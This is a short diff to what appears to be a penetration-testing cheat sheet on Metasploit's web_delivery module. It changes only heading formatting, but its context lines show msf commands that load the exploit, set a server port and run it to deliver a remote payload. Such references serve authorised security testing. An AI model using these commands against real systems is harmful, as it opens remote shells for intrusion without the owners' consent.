@@ -101,7 +101,7 @@ msf exploit(multi/script/web_delivery) > run -j
 
 ## 03 - Cross Platform
 
-- Python Web Delivery
+Python Web Delivery
 
 ```
 msf > use exploit/multi/script/web_delivery
@@ -150,7 +150,7 @@ msf exploit(multi/script/web_delivery) > set srvport <server_PORT>
 msf exploit(multi/script/web_delivery) > run -j
 ```
 
-- PHP Web Delivery
+PHP Web Delivery
 
 ```
 msf > use exploit/multi/script/web_delivery
